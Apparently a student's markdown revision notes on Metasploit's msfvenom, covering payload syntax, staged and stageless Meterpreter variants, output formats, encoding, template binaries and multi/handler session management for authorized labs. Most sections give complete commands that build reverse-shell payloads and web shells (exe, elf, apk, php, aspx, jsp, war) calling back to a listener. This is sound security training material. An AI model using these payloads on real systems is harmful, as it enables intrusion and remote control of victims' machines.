# MSFVENOM & PAYLOAD GENERATION

> **Revision Edition**\
> `CHOOSE PAYLOAD → CHOOSE FORMAT → GENERATE → HANDLER → DELIVER IN LAB → SESSION`

> \[!CAUTION\] These notes organize the supplied training material for
> controlled labs and explicitly authorized systems.

------------------------------------------------------------------------

# 🗺️ Journey Map

\| Stage \| Topic \| Key Command / Idea \| \|\-\--\|\-\--\|\-\--\| \|
**01** \| Msfvenom basics \| `msfvenom` \| \| **02** \| Core syntax \|
`-p`, `-f`, `-o`, `LHOST`, `LPORT` \| \| **03** \| Discovery \|
`-l payloads`, `-l formats`, `--list-options` \| \| **04** \| Staged vs.
stageless \| `/` vs `_` \| \| **05** \| Output formats \| `exe`, `elf`,
`raw`, `c`, `war`, etc. \| \| **06** \| Encoding \| `-e`, `-i`, `-b` \|
\| **07** \| Platform selection \| Windows, Linux, PHP, Java, Android,
macOS \| \| **08** \| Handler \| `exploit/multi/handler` \| \| **09** \|
Session management \| `run -j`, `sessions -l`, `sessions -i` \| \|
**10** \| Lab workflow \| Generate → Handler → Deliver → Execute →
Verify \|

------------------------------------------------------------------------

# 01 --- 🧠 What Is Msfvenom?

`msfvenom` is the Metasploit Framework\'s command-line
payload-generation utility. It runs from a normal terminal rather than
the `msf6 >` prompt.

The supplied notes describe it as capable of producing standalone
executables, web payloads, and transform-format output for different
platforms.

## History

``` text
OLD:
msfpayload + msfencode

        ↓ merged

CURRENT:
msfvenom
```

The notes state that the older tools were merged into `msfvenom` in
2015.

------------------------------------------------------------------------

# 02 --- ⚡ Core Command Structure

## MASTER SYNTAX

``` bash
msfvenom -p <payload> LHOST=<your_ip> LPORT=<your_port> -f <format> -o <output_file>
```

## 🧩 Read It Left → Right

``` text
msfvenom
   │
   ├── -p       → PAYLOAD
   ├── LHOST=   → LISTENER IP
   ├── LPORT=   → LISTENER PORT
   ├── -f       → OUTPUT FORMAT
   └── -o       → OUTPUT FILE
```

## Lab Example from the Notes

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=10.48.105.74 \
LPORT=4444 \
-f exe \
-o shell.exe
```

## 🔑 Flag Reference

\| Flag / Option \| Purpose \| \|\-\--\|\-\--\| \| `-p` \| Select
payload \| \| `-f` \| Select output format \| \| `-o` \| Save output to
file \| \| `-e` \| Select encoder \| \| `-i` \| Encoding iterations \|
\| `-b` \| Bad characters to avoid \| \| `-x` \| Template binary \| \|
`-k` \| Attempt to preserve template behavior \| \| `-a` \| Override
architecture \| \| `--platform` \| Override platform \| \| `-n` \|
Prepend NOP bytes \| \| `LHOST=` \| Listener IP \| \| `LPORT=` \|
Listener port \|

> \[!IMPORTANT\] `LHOST` and `LPORT` are **payload options**, not
> command-line flags, so they do not start with `-`.

------------------------------------------------------------------------

# 03 --- 🔎 Discover What Msfvenom Supports

## ⚡ List Payloads

``` bash
msfvenom -l payloads
```

Filter the long output:

``` bash
msfvenom -l payloads | grep linux | grep meterpreter
```

## ⚡ List Formats

``` bash
msfvenom -l formats
```

## ⚡ List Encoders

``` bash
msfvenom -l encoders
```

## ⚡ List Platforms

``` bash
msfvenom -l platforms
```

## ⚡ List Architectures

``` bash
msfvenom -l archs
```

## ⚡ Check Payload Options

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

### 🧠 Discovery Memory

``` text
-l payloads
-l formats
-l encoders
-l platforms
-l archs
--list-options
```

------------------------------------------------------------------------

# 04 --- 🔀 Staged vs. Stageless

## How to Recognize Them

### STAGED

``` text
windows/x64/meterpreter/reverse_tcp
                       ↑
                       /
```

### STAGELESS

``` text
windows/x64/meterpreter_reverse_tcp
                       ↑
                       _
```

## Comparison

\| Factor \| Stageless \| Staged \| \|\-\--\|\-\--\|\-\--\| \| Payload
\| Entire payload included \| Small stager first \| \| Initial size \|
Larger \| Smaller \| \| Second transfer \| No \| Yes \| \| Reliability
\| More self-contained \| Depends on stage transfer \| \| Common
msfvenom use \| Standalone payloads \| Supported \| \| Common msfconsole
use \| Less common default \| Common default \|

## ⚡ Staged Lab Example

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f exe -o staged.exe
```

## ⚡ Stageless Lab Example

``` bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f exe -o stageless.exe
```

### 🧠 Memory Trick

``` text
/ = STAGED
_ = STAGELESS
```

------------------------------------------------------------------------

# 05 --- 📦 Output Formats

Msfvenom formats in the supplied notes fall into two broad categories.

## Executable Formats

These create standalone files.

\| Platform / Use \| Format \| \|\-\--\|\-\--\| \| Windows \| `exe` \|
\| Linux \| `elf` \| \| macOS \| `macho` \| \| Windows Installer \|
`msi` \| \| Android \| `apk` \| \| Java web app \| `war` \|

## Transform Formats

These produce code/data intended to be embedded elsewhere.

``` text
raw
c
csharp
python
powershell
hex
base64
```

### 🧠 Rule of Thumb

``` text
TARGET RUNS THE FILE
        ↓
Executable format

OUTPUT IS EMBEDDED ELSEWHERE
        ↓
Transform format
```

------------------------------------------------------------------------

# 06 --- 🧪 Payload Recipes from the Lab Notes

## 🪟 Windows EXE

``` bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f exe -o shell.exe
```

## 🐧 Linux ELF

``` bash
msfvenom -p linux/x64/meterpreter_reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f elf -o shell.elf
```

The supplied notes then use:

``` bash
chmod +x shell.elf
```

before executing the ELF in the controlled Linux lab.

## 🐘 PHP

``` bash
msfvenom -p php/meterpreter_reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f raw -o shell.php
```

## 🐍 Python Command Payload

``` bash
msfvenom -p cmd/unix/reverse_python \
LHOST=10.48.105.74 LPORT=4444 \
-f raw
```

## 🧱 C Transform Output

``` bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f c
```

------------------------------------------------------------------------

# 07 --- 🧭 Quick Format Selection

\| Scenario in Notes \| Payload Family \| Format \|
\|\-\--\|\-\--\|\-\--\| \| Windows executable \| Windows Meterpreter \|
`exe` \| \| Linux executable \| Linux Meterpreter \| `elf` \| \| PHP web
context \| PHP Meterpreter \| `raw` \| \| Python command context \|
Unix/Python \| `raw` \| \| C embedding \| Windows/Linux payload \| `c`
\| \| PowerShell output \| Windows Meterpreter \| `powershell` \| \|
Java application \| Java Meterpreter \| `war` \| \| Windows Installer \|
Windows Meterpreter \| `msi` \|

------------------------------------------------------------------------

# 08 --- 🔤 Encoding

> **KEY LESSON FROM THE SOURCE:**\
> **Encoding ≠ antivirus evasion.**

The supplied notes explain encoding mainly as a way to transform payload
bytes for technical constraints such as **bad-character removal** and
**format compliance**.

## Relevant Flags

``` text
-e → encoder
-i → iterations
-b → bad characters
```

## ⚡ Encoding Example from the Lab

``` bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f exe \
-e x86/shikata_ga_nai \
-i 3 \
-o encoded.exe
```

## ⚡ Avoid Bad Characters

``` bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f c \
-b '\x00\x0a\x0d'
```

### Why Encoding Is Not Modern AV Evasion

The source specifically mentions modern detection through:

-   Heuristic/behavioral analysis
-   Sandboxing
-   AMSI
-   Machine-learning-based detection

------------------------------------------------------------------------

# 09 --- 🧩 Template Binary Options

The supplied material introduces:

``` text
-x → use an existing executable as a template
-k → attempt to preserve the template's normal behavior
```

It also emphasizes important detection limitations:

``` text
Modified hash
     +
Broken digital signature
     +
AV/EDR heuristics
```

> \[!IMPORTANT\] The source presents template injection as a
> controlled-lab/CTF technique and notes that it is well known to modern
> security products.

------------------------------------------------------------------------

# 10 --- 🌍 Platform Examples

## Android

``` bash
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-o evil.apk
```

## macOS

``` bash
msfvenom -p osx/x64/meterpreter_reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f macho -o shell.macho
```

## Java WAR

``` bash
msfvenom -p java/meterpreter/reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f war -o shell.war
```

## ASPX

``` bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
LHOST=10.10.14.12 LPORT=4444 \
-f aspx -o shell.aspx
```

## JSP

``` bash
msfvenom -p java/meterpreter/reverse_tcp \
LHOST=10.48.105.74 LPORT=4444 \
-f jsp -o shell.jsp
```

## 🧠 Platform Decision Tree

``` text
WHAT OS / RUNTIME?
       ↓
Choose payload platform
       ↓
HOW IS IT DELIVERED IN THE LAB?
       ↓
Choose output format
       ↓
WHAT RUNTIME EXISTS?
       ↓
Native / PHP / Java / etc.
```

------------------------------------------------------------------------

# 11 --- 🎧 Multi/Handler

A reverse payload needs a listener. The supplied notes use
Metasploit\'s:

``` text
exploit/multi/handler
```

## ⚡ Basic Handler Setup

``` text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.48.105.74
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > run
```

Expected listener state in the lab:

``` text
Started reverse TCP handler
```

------------------------------------------------------------------------

# 12 --- ⭐ Golden Rule: EVERYTHING MUST MATCH

The source emphasizes that these three values must match between
generation and handler configuration:

\| Msfvenom \| Handler \| \|\-\--\|\-\--\| \| `-p <payload>` \|
`set PAYLOAD <same payload>` \| \| `LHOST=<IP>` \| `set LHOST <same IP>`
\| \| `LPORT=<port>` \| `set LPORT <same port>` \|

## 🚨 Common Error

``` text
GENERATED:
meterpreter/reverse_tcp

HANDLER:
meterpreter_reverse_tcp
```

These are **not the same payload**.

``` text
/ = staged
_ = stageless
```

------------------------------------------------------------------------

# 13 --- 🧵 Handler & Session Management

## ⚡ Run Handler as Background Job

``` text
msf6 exploit(multi/handler) > run -j
```

## ⚡ List Sessions

``` text
sessions -l
```

## ⚡ Interact with Session

``` text
sessions -i 1
```

## ⚡ Continue Listening After a Session

``` text
set ExitOnSession false
```

The supplied notes also mention `AutoRunScript` for automatically
running a specified post module when a session opens.

------------------------------------------------------------------------

# 14 --- 🔁 Complete Lab Workflow

``` text
┌──────────────────────┐
│ 1. CHOOSE PAYLOAD    │
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 2. CHOOSE FORMAT     │
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 3. GENERATE          │
│    msfvenom          │
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 4. START HANDLER     │
│    multi/handler     │
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 5. LAB DELIVERY      │
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 6. EXECUTE IN LAB    │
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 7. CATCH SESSION     │
└──────────┬───────────┘
           ▼
┌──────────────────────┐
│ 8. VERIFY            │
│ sysinfo / getuid     │
└──────────────────────┘
```

------------------------------------------------------------------------

# ⚡ MASTER COMMAND CHEAT SHEET

## 🔎 Discovery

``` bash
msfvenom -l payloads
msfvenom -l formats
msfvenom -l encoders
msfvenom -l platforms
msfvenom -l archs
msfvenom -p <payload> --list-options
```

## 🏗️ Generation Pattern

``` bash
msfvenom -p <payload> \
LHOST=<your_ip> \
LPORT=<your_port> \
-f <format> \
-o <file>
```

## 🎧 Handler Pattern

``` text
use exploit/multi/handler
set PAYLOAD <exact_payload>
set LHOST <same_LHOST>
set LPORT <same_LPORT>
show options
run
```

## 🧵 Background Handler

``` text
run -j
sessions -l
sessions -i <id>
```

## 🔍 Verify Session

``` text
getuid
sysinfo
pwd
ls
```

------------------------------------------------------------------------

# 🧠 30-Second Revision

``` text
MSFVENOM
   │
   ├── -p = PAYLOAD
   ├── -f = FORMAT
   ├── -o = OUTPUT
   ├── LHOST = LISTENER IP
   └── LPORT = LISTENER PORT
            │
            ▼
      STAGED OR STAGELESS?
       /              _
       │              │
     staged        stageless
            │
            ▼
       START HANDLER
            │
            ▼
  PAYLOAD + LHOST + LPORT
       MUST MATCH
            │
            ▼
         SESSION
```

------------------------------------------------------------------------

# 🏁 My Cyber Journey Progress

``` text
RECONNAISSANCE
      ↓
VULNERABILITY IDENTIFICATION
      ↓
EXPLOITATION
      ↓
METERPRETER
      ↓
POST-EXPLOITATION
      ↓
MSFVENOM PAYLOAD GENERATION
      ↓
HANDLER + SESSION MANAGEMENT
```

## Main Takeaways

**Msfvenom:** generates payload output.\
**Multi/handler:** listens for compatible reverse connections.\
**Payload + LHOST + LPORT:** must match.\
**`/`:** staged.\
**`_`:** stageless.\
**Encoding:** primarily solves byte/format constraints; the supplied
material explicitly warns not to treat it as modern antivirus evasion.
